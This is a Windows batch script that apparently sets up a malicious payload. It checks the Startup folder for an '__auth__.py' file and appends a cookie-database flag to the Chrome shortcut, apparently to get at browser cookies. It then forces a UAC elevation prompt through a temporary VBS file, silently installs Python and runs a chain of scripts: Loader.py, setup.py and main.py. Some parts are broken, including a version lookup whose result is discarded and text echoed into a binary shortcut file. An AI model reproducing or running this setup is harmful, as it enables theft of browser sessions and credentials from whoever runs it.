@echo off

cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

if exist __auth__.py (
    echo __auth__.py exists
) else (
    echo __auth__.py does not exist

    set "chrome=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Google Chrome.lnk"
    set "argument=--enable-features=LockProfileCookieDatabase"

    echo Setting the command in Chrome shortcut...

    findstr /C:"%argument%" "%chrome%" >nul 2>&1
    if %errorlevel% equ 0 (
    ) else (
        echo %argument% >> "%chrome%"
    )
)

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

for /f "tokens=1,2 delims= " %%a in ('powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/ -UseBasicParsing | Select-String -Pattern '3.10.[0-9]{1,2}' -AllMatches | Select-Object -ExpandProperty Matches | Select-Object -ExpandProperty Value | Sort-Object -Descending -Unique | Select-Object -First 1"') do (
    set "PYTHON_VERSION=3.11.0"
)
set "PYTHON_URL=https://www.python.org/ftp/python/%PYTHON_VERSION%/python-%PYTHON_VERSION%-amd64.exe"
set "PYTHON_EXE=python-installer.exe"

curl -L -o %PYTHON_EXE% %PYTHON_URL%

start /wait %PYTHON_EXE% /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0

del %PYTHON_EXE%

Loader.py

batchmanifest.py

timeout /t 1 /nobreak

pip install -r requirements.txt

timeout /t 1 /nobreak

setup.py

timeout /t 1 /nobreak

main.py
